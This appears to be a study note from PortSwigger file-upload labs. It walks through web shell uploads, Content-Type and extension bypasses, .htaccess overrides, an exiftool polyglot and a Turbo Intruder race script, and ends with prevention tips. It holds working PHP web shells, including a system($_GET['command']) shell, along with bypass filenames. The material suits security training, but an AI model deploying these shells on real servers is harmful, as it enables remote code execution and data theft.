## Definition
Web server allows users to upload files to its FS without sufficiently validating things 
(their name, type, contents, or size)

## Impact
- overwrite critical files simply by uploading a file with the same name
- If the server is also vulnerable to directory traversal
  => attackers are even able to upload files to unanticipated locations

## Exploiting unrestricted file uploads to deploy a web shell
`<?php echo file_get_contents('/path/to/target/file'); ?>`
=>
- While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
- Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
- In Burp, go to **Proxy > HTTP history**. Click the filter bar to open the **HTTP history filter** window. Under **Filter by MIME type**, enable the **Images** checkbox, then apply your changes.
- In the proxy history, notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
- On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret file. For example:
  `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
- In Burp Repeater, change the path of the request to point to your PHP file:
  `GET /files/avatars/exploit.php HTTP/1.1`
- Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
- Submit the secret to solve the lab

A more versatile web shell may look something like this:
`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:
`GET /example/exploit.php?command=id HTTP/1.1`

## Exploiting flawed validation of file uploads
### Flawed file type validation
Sometimes the check is only performed:
inside the `Content-Type:` field

in this case you can:
- upload a php shell
- intercept the packet
- change the `Content-Type:` field to `image/jpeg` 
  ![[Pasted image 20240910171421.png]]
- send the packet
- then open the image in a new tab =>  you'll execute the shell

### Preventing file execution in user-accessible directories
servers generally:
only run scripts whose MIME type they have been explicitly configured to execute
=>
- upload a php shell
- intercept the packet
- change the `Content-Type:` field to `image/jpeg` 
- change the `filename` to`"..%2fexploit1.php"`
	- `"..%2f"` is the encoded version of `"..\"`
- send the packet
- look at the response
	- it says -->  `The file avatars/../exploit1.php has been uploaded`
- then open the image in a new tab
- go one directory before =>  `/files/exploit1.php`

### Insufficient blacklisting of dangerous file types
The obvious method to prevent file upload -->  is to block the extension
but if you block `.php`
you can also still use -->  `.php5`, `.shtml` 

#### Overriding the server configuration
As we discussed in the previous section:
servers typically won't execute files unless they have been configured to do so. 

For example, before an Apache server will execute PHP files requested by a client:
developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:
```
`LoadModule php_module /usr/lib/apache2/modules/libphp.so 
	AddType application/x-httpd-php .php`
```
Many servers:
also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. 

Apache servers, for example:
will load a directory-specific configuration from a file called `.htaccess` if one is present.

Similarly, developers:
can make directory-specific configuration on IIS servers using a `web.config` file. 
This might include directives such as the following, which in this case allows JSON files to be served to users:
```
<staticContent>
	<mimeMap fileExtension=".json" mimeType="application/json" /> 
</staticContent>
```

##### Web shell upload via extension blacklist bypass
- upload a php shell
- intercept the packet
- you'll see that you can upload a php file
- Change the value of the `filename` parameter to `.htaccess`
- Change the value of the `Content-Type` header to `text/plain`
- Replace the contents of the shell with -->  `AddType application/x-httpd-php .l33t`
  =>
  This:
  maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module
  =>
  it knows how to handle this already

- Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit.
- Change the value of the `filename` parameter from `exploit.php` to `exploit.l33t`
- Send the request again and notice that the file was uploaded successfully
- then open the image in a new tab
- it will execute the shell

#### Obfuscating file extensions
you can try to:
- use upper ch  -->  es `.pHp`
- provide multiple extensions -->  `exploit.php.jpg`
                             Depending on the algorithm used to parse the filename:
                             it can be interpreted as `php` or `jpg`
- add trailing ch -->  `exploit.php.`
- using URL encoding or double encoding for dots, slashes-->  `exploit%2Ephp`
- add semicolons or URL-encoded null byte characters before the file extension:
	- `exploit.asp;.jpg`
	- `exploit.asp%00.jpg`
- using multibyte unicode ch that can be converted to null bytes and dots after unicode conversion:
	- Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E`

Other defenses involve:
stripping or replacing dangerous extensions to prevent the file from being executed. 

If this transformation isn't applied recursively:
=>
you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. 
For example, consider what happens if you strip `.php` from the following filename:
`exploit.p.phphp`

##### Web shell upload via obfuscated file extension
Only `png` and `jpg` allowed
=>
`filename="exploit1.php%00.jpg"`

#### Flawed validation of the file's contents
Instead of implicitly trusting the `Content-Type` specified in a request:
more secure servers -->  try to verify that 
                       the contents of the file actually match what is expected

In the case of an image upload function:
the server might try to verify -->  certain intrinsic properties of an image
                             such as its dimensions
=>
If you try uploading a PHP script, for example:
it won't have any dimensions at all
=>
 the server can deduce that -->   it can't possibly be an image, 
                            and reject the upload accordingly

Certain file types:
may always contain a specific sequence of bytes in their header or footer. 
For example, JPEG files always begin with the bytes `FF D8 FF`

##### Remote code execution via polyglot web shell upload
we need to use `exiftool` to create a polyglot shell
=>
`sudo apt install libimage-exiftool-perl`
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" REAL-IMG.png -o polyglot.php`
=>
This adds your PHP payload to the image's `Comment` field

- upload the ` polyglot.php` file
- then open the image in a new tab![[Pasted image 20240911093141.png]]

### Exploiting file upload race conditions
Modern frameworks:
- take precautions like uploading to a temporary, sandboxed directory
- and randomizing the name to avoid overwriting existing files
- then perform validation on this temporary file 
- only transfer it to its destination once it is deemed safe to do so
but:
developers sometimes -->   implement their own processing of file uploads 
                        independently of any framework
- Not only is this fairly complex to do well
- it can also introduce dangerous [race conditions](https://portswigger.net/web-security/race-conditions) 
	- that enable an attacker to completely bypass even the most robust validation

For example:
- some websites upload the file directly to the main FS 
- then remove it again if it doesn't pass validation
This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware.
=>
This may only take a few milliseconds
BUT:
for the short time that the file exists on the server -->  the attacker can potentially still 
                                               execute it

##### Web shell upload via race condition
- try to upload the shell php
- install the plugin Turbo Intruder in Burp
- you can't but open the packet in Burp > right click > Extension > Turbo Intruder > 
- Send to Turbo Intruder
- copy as payload python:
```python
def queueRequests(target, wordlists):
	engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
	request1 = '''<YOUR-POST-REQUEST>''' 
	request2 = '''<YOUR-GET-REQUEST>''' 
	# the 'gate' argument blocks the final byte of each request until openGate is invoked
	engine.queue(request1, gate='race1') 
	for x in range(5): 
		engine.queue(request2, gate='race1') 
	# wait until every 'race1' tagged request is ready 
	# then send the final byte of each request 
	# (this method is non-blocking, just like queue) 
	engine.openGate('race1') 
	engine.complete(timeout=60) 
	
def handleResponse(req, interesting): 
	table.add(req)`
```
- change `<YOUR-POST-REQUEST>` with the entire `POST /my-account/avatar` request
  (copy all the request in the upper part of the Turbo Intruder tab)
- change `<YOUR-GET-REQUEST>` with a `GET` request for fetching your uploaded PHP file
  =>
- in HTTP PROXY click on filter proxy and enable Image
- on the website upload an image and click back on your account
- in burp you'll see a `GET /files/avatars/<YOUR-IMAGE>`
- change `<YOUR-GET-REQUEST>` with that request and change the name to `exploit.php`
  (the name of the shell that you've uploaded before)
- At the bottom of the Turbo Intruder window, click **Attack**
=>
This script will:
- submit a single `POST` request to upload your `exploit.php` file
- instantly followed by 5 `GET` requests to `/files/avatars/exploit.php`.
In the results list:
notice that some of the `GET` reqs received a 200 response -->  containing Carlos's secret

## Prevent file upload vulnerabilities
- Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones.
  It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.
- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (`../`).
- Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
- Do not upload files to the server's permanent FS until they have been fully validated.
- As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms